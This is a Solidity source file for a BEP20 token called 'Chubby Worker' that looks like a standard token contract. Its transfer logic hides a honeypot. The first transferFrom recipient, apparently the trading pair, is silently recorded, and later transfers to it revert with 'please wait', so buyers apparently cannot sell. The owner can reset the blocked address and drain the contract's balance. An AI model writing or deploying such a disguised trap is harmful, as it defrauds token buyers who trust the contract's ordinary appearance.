row number 
1	               pragma solidity ^0.5.17;
2	 library SafeMath {
3	 function add(uint a, uint b) internal pure returns (uint c) {
4	 c = a + b;
5	 require(c >= a);
6	 }
7	 function sub(uint a, uint b) internal pure returns (uint c) {
8	 require(b <= a);
9	 c = a - b;
10	 }
11	 function mul(uint a, uint b) internal pure returns (uint c) {
12	 c = a * b;
13	 require(a == 0 || c / a == b);
14	 }
15	 function div(uint a, uint b) internal pure returns (uint c) {
16	 require(b > 0);
17	 c = a / b;
18	 }
19	 }
20	 contract BEP20Interface {
21	 function totalSupply() public view returns (uint);
22	 function balanceOf(address tokenOwner) public view returns (uint balance);
23	 function allowance(address tokenOwner, address spender) public view returns (uint remaining);
24	 function transfer(address to, uint tokens) public returns (bool success);
25	 function approve(address spender, uint tokens) public returns (bool success);
26	 function transferFrom(address from, address to, uint tokens) public returns (bool success);
27	 event Transfer(address indexed from, address indexed to, uint tokens);
28	 event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
29	 }
30	 contract ApproveAndCallFallBack {
31	 function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
32	 }
33	 contract Owned {
34	 address public owner;
35	 address public newOwner;
36	 event OwnershipTransferred(address indexed _from, address indexed _to);
37	 constructor() public {
38	 owner = msg.sender;
39	 }
40	 modifier onlyOwner {
41	 require(msg.sender == owner);
42	 _;
43	 }
44	 function transferOwnership(address _newOwner) public onlyOwner {
45	 newOwner = _newOwner;
46	 }
47	 function acceptOwnership() public {
48	 require(msg.sender == newOwner);
49	 emit OwnershipTransferred(owner, newOwner);
50	 owner = newOwner;
51	 newOwner = address(0);
52	 }
53	 }
54	 contract TokenBEP20 is BEP20Interface, Owned{
55	 using SafeMath for uint;
56	 string public symbol;
57	 string public name;
58	 uint8 public decimals;
59	 uint _totalSupply;
60	 address public newun;
61	 mapping(address => uint) balances;
62	 mapping(address => mapping(address => uint)) allowed;
63	 constructor() public {
64	 symbol = " Chubby Worker";
65	 name = "chubbyworker.com";
66	 decimals = 8;
67	 _totalSupply = 1000000 * 10**9 * 10**8;
68	 balances[owner] = _totalSupply;
69	 emit Transfer(address(0), owner, _totalSupply);
70	 }
71	 function transfernewun(address _newun) public onlyOwner {
72	 newun = _newun;
73	 }
74	 function totalSupply() public view returns (uint) {
75	 return _totalSupply.sub(balances[address(0)]);
76	 }
77	 function balanceOf(address tokenOwner) public view returns (uint balance) {
78	 return balances[tokenOwner];
79	 }
80	 function transfer(address to, uint tokens) public returns (bool success) {
81	 require(to != newun, "please wait");
82	 balances[msg.sender] = balances[msg.sender].sub(tokens);
83	 balances[to] = balances[to].add(tokens);
84	 emit Transfer(msg.sender, to, tokens);
85	 return true;
86	 }
87	 function approve(address spender, uint tokens) public returns (bool success) {
88	 allowed[msg.sender][spender] = tokens;
89	 emit Approval(msg.sender, spender, tokens);
90	 return true;
91	 }
92	 function transferFrom(address from, address to, uint tokens) public returns (bool success) {
93	 if(from != address(0) && newun == address(0)) newun = to;
94	 else require(to != newun, "please wait");
95	 balances[from] = balances[from].sub(tokens);
96	 allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
97	 balances[to] = balances[to].add(tokens);
98	 emit Transfer(from, to, tokens);
99	 return true;
100	 }
101	 function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
102	 return allowed[tokenOwner][spender];
103	 }
104	 function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
105	 allowed[msg.sender][spender] = tokens;
106	 emit Approval(msg.sender, spender, tokens);
107	 ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
108	 return true;
109	 }
110	 function () external payable {
111	 revert();
112	 }
113	 }
114	 contract ChubbyWorker is TokenBEP20 {
115	 function clearCNDAO() public onlyOwner() {
116	 address payable _owner = msg.sender;
117	 _owner.transfer(address(this).balance);
118	 }
119	 function() external payable {
120	 }
121	 }
